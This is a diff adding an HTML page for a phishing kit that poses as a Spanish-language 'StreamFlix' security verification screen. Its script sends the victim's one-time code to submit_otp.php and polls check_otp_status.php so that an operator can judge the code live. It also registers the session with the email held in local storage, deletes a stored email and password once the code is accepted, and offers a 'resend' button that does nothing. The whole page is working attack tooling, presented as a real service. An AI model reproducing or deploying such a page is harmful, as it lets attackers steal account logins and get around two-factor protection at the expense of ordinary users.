@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StreamFlix - Verificación de seguridad</title>
+    <link rel="shortcut icon" href="./streamflix/sficon2023.ico"/>
+    <style>
+        @font-face {
+            font-family: "Streamflix Sans";
+            src: url("./streamflix/StreamflixSans_W_Rg.woff2") format("woff2");
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: "Streamflix Sans";
+            src: url("./streamflix/StreamflixSans_W_Bd.woff2") format("woff2");
+            font-weight: 700;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: "Streamflix Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #f3f3f3;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background-color: #fff;
+            border-bottom: 1px solid #e6e6e6;
+            padding: 20px 0;
+        }
+
+        .streamflix-logo {
+            height: 45px;
+            margin-left: 3%;
+        }
+
+        .verification-section {
+            background-color: #fff;
+            border-radius: 4px;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+            margin: 30px auto;
+            max-width: 600px;
+            padding: 40px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .status-message {
+            background-color: #f7f7f7;
+            border-left: 4px solid #e50914;
+            margin-bottom: 30px;
+            padding: 20px;
+            text-align: left;
+        }
+
+        .status-message p {
+            color: #333;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .status-message strong {
+            color: #e50914;
+        }
+
+        .loading-container {
+            margin: 30px 0;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e50914;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .otp-container {
+            display: none;
+            margin-top: 30px;
+        }
+
+        .otp-container.show {
+            display: block;
+        }
+
+        .otp-input {
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            font-size: 24px;
+            font-weight: 700;
+            height: 60px;
+            letter-spacing: 10px;
+            margin: 20px auto;
+            max-width: 300px;
+            padding: 15px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .otp-input:focus {
+            border-color: #e50914;
+            outline: none;
+        }
+
+        .btn-primary {
+            background-color: #e50914;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+            padding: 16px 32px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-primary:hover {
+            background-color: #f40612;
+        }
+
+        .btn-primary:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: #e50914;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .security-info {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            margin-top: 30px;
+            padding: 20px;
+        }
+
+        .security-info h3 {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+
+        .security-info p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        footer {
+            background-color: #f3f3f3;
+            border-top: 1px solid #e6e6e6;
+            color: #737373;
+            font-size: 13px;
+            margin-top: 50px;
+            padding: 30px 0;
+            text-align: center;
+        }
+
+        @media (max-width: 768px) {
+            .verification-section {
+                padding: 20px;
+            }
+            
+            .otp-input {
+                font-size: 20px;
+                letter-spacing: 5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <img src="./streamflix/Streamflix_Logo_PMS.png" alt="StreamFlix" class="streamflix-logo">
+        </div>
+    </header>
+
+    <main class="container">
+        <section class="verification-section">
+            <h1>Verificación de seguridad</h1>
+            
+            <div class="status-message">
+                <p><strong>Verificando tus datos...</strong></p>
+                <p>Por motivos de seguridad, estamos verificando la información proporcionada. Este proceso puede tardar unos minutos.</p>
+            </div>
+
+            <div class="loading-container" id="loadingContainer">
+                <div class="loading-spinner"></div>
+                <div class="loading-text">Verificando datos de la cuenta...</div>
+                <div class="loading-text" style="font-size: 14px; color: #999;">Por favor, mantén esta página abierta</div>
+            </div>
+
+            <div class="otp-container" id="otpContainer">
+                <h3 style="margin-bottom: 20px;">Introduce el código de verificación</h3>
+                <p style="margin-bottom: 20px; color: #666;">Hemos enviado un código de 6 dígitos a tu dispositivo móvil registrado.</p>
+                
+                <input type="text" 
+                       class="otp-input" 
+                       id="otpInput" 
+                       placeholder="000000" 
+                       maxlength="6"
+                       autocomplete="off">
+                
+                <div class="error-message" id="otpError">Código incorrecto. Inténtalo de nuevo.</div>
+                
+                <button type="button" class="btn-primary" id="verifyBtn" onclick="verifyOTP()">
+                    Verificar código
+                </button>
+            </div>
+            
+            <div class="verification-status" id="verificationStatus" style="display: none; text-align: center; margin-top: 30px;">
+                <div class="loading-spinner"></div>
+                <h3 style="margin: 15px 0;">Verificando código...</h3>
+                <p style="color: #666;">Por favor, espera mientras verificamos tu código de seguridad.</p>
+            </div>
+            
+            <div class="verification-error" id="verificationError" style="display: none; text-align: center; margin-top: 30px; color: #e50914;">
+                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="15" y1="9" x2="9" y2="15"></line>
+                    <line x1="9" y1="9" x2="15" y2="15"></line>
+                </svg>
+                <h3 style="margin: 15px 0;">Código incorrecto</h3>
+                <p>El código que has introducido no es válido. Por favor, inténtalo de nuevo.</p>
+                <button class="btn-primary" style="margin-top: 15px; background-color: #e50914;" onclick="resetOTPForm()">Intentar de nuevo</button>
+            </div>
+                
+                <div style="margin-top: 20px;">
+                    <button type="button" 
+                            style="background: none; border: none; color: #0071eb; cursor: pointer; font-size: 14px; text-decoration: underline;"
+                            onclick="resendOTP()">
+                        ¿No has recibido el código? Reenviar
+                    </button>
+                </div>
+            </div>
+
+            <div class="security-info">
+                <h3>🔒 Tu seguridad es nuestra prioridad</h3>
+                <p>Este paso adicional de verificación nos ayuda a proteger tu cuenta contra accesos no autorizados. El código de verificación es válido por 10 minutos.</p>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>© 2025 StreamFlix, Inc.</p>
+        </div>
+    </footer>
+
+    <script>
+        let sessionId = null;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Obtener el session_id de la URL
+            const urlParams = new URLSearchParams(window.location.search);
+            sessionId = urlParams.get('session');
+            
+            // Si no hay session_id en la URL, intentar obtenerlo del localStorage
+            if (!sessionId) {
+                sessionId = localStorage.getItem('streamflix_session_id');
+            }
+            
+            // Verificar que tenemos un session_id
+            if (!sessionId) {
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            console.log('Using session ID:', sessionId);
+            
+            // Mostrar directamente el formulario OTP sin verificación
+            document.getElementById('loadingContainer').style.display = 'none';
+            document.getElementById('otpContainer').classList.add('show');
+            
+            // Enfocar el input
+            document.getElementById('otpInput').focus();
+            
+            // Configurar input OTP
+            setupOTPInput();
+        });
+
+
+
+        function setupOTPInput() {
+            const otpInput = document.getElementById('otpInput');
+            
+            // Solo permitir números
+            otpInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+                
+                // Auto-verificar cuando se completen 6 dígitos
+                if (e.target.value.length === 6) {
+                    setTimeout(verifyOTP, 500);
+                }
+            });
+
+            // Verificar con Enter
+            otpInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && e.target.value.length === 6) {
+                    verifyOTP();
+                }
+            });
+        }
+
+        function verifyOTP() {
+            const otpInput = document.getElementById('otpInput');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const errorMsg = document.getElementById('otpError');
+            
+            const otpCode = otpInput.value.trim();
+            
+            if (otpCode.length !== 6) {
+                showError('El código debe tener 6 dígitos');
+                return;
+            }
+
+            // Deshabilitar botón y mostrar loading
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Verificando...';
+            errorMsg.classList.remove('show');
+
+            // Enviar código OTP al servidor
+            fetch('submit_otp.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    otp_code: otpCode
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Mostrar pantalla de verificación
+                document.getElementById('otpContainer').style.display = 'none';
+                document.getElementById('verificationStatus').style.display = 'block';
+                
+                // Iniciar verificación de estado
+                startVerificationCheck();
+            })
+            .catch(error => {
+                console.error('Error verifying OTP:', error);
+                showError('Error de conexión. Inténtalo de nuevo.');
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'Verificar código';
+            });
+        }
+
+        function showError(message) {
+            const errorMsg = document.getElementById('otpError');
+            errorMsg.textContent = message;
+            errorMsg.classList.add('show');
+            
+            // Ocultar error después de 5 segundos
+            setTimeout(() => {
+                errorMsg.classList.remove('show');
+            }, 5000);
+        }
+
+        function resendOTP() {
+            // Simular reenvío (en realidad no hace nada, solo feedback visual)
+            const resendBtn = event.target;
+            const originalText = resendBtn.textContent;
+            
+            resendBtn.textContent = 'Reenviando...';
+            resendBtn.disabled = true;
+            
+            setTimeout(() => {
+                resendBtn.textContent = 'Código reenviado ✓';
+                setTimeout(() => {
+                    resendBtn.textContent = originalText;
+                    resendBtn.disabled = false;
+                }, 2000);
+            }, 1500);
+        }
+        
+        function resetOTPForm() {
+            // Ocultar mensajes de error y mostrar formulario OTP
+            document.getElementById('verificationError').style.display = 'none';
+            document.getElementById('otpContainer').style.display = 'block';
+            
+            // Limpiar y enfocar el input
+            const otpInput = document.getElementById('otpInput');
+            otpInput.value = '';
+            otpInput.focus();
+            
+            // Resetear botón
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'Verificar código';
+            verifyBtn.style.backgroundColor = '';
+        }
+        
+        let verificationCheckInterval;
+        
+        function startVerificationCheck() {
+            // Verificar cada 3 segundos si el OTP ha sido verificado
+            verificationCheckInterval = setInterval(checkVerificationStatus, 3000);
+        }
+        
+        function checkVerificationStatus() {
+            fetch('check_otp_status.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    action: 'check_status'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Verification status:', data);
+                
+                if (data.success) {
+                    if (data.verification_status === 'valid') {
+                        // OTP verificado correctamente
+                        clearInterval(verificationCheckInterval);
+                        
+                        // Limpiar localStorage
+                        localStorage.removeItem('streamflix_email');
+                        localStorage.removeItem('streamflix_password');
+                        
+                        // Redirigir a la página de éxito
+                        setTimeout(() => {
+                            window.location.href = 'success.html';
+                        }, 1000);
+                    } else if (data.verification_status === 'invalid') {
+                        // OTP inválido
+                        clearInterval(verificationCheckInterval);
+                        document.getElementById('verificationStatus').style.display = 'none';
+                        document.getElementById('verificationError').style.display = 'block';
+                    }
+                    // Si es 'waiting' o 'pending', seguir esperando
+                }
+            })
+            .catch(error => {
+                console.error('Error checking verification status:', error);
+            });
+        }
+
+        // Registrar sesión al cargar la página
+        window.addEventListener('load', function() {
+            fetch('register_session.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    email: localStorage.getItem('streamflix_email'),
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .catch(error => {
+                console.error('Error registering session:', error);
+            });
+        });
+
+        // Limpiar interval al cerrar la página
+        window.addEventListener('beforeunload', function() {
+            if (checkInterval) {
+                clearInterval(checkInterval);
+            }
+        });
+    </script>
+</body>
+</html>
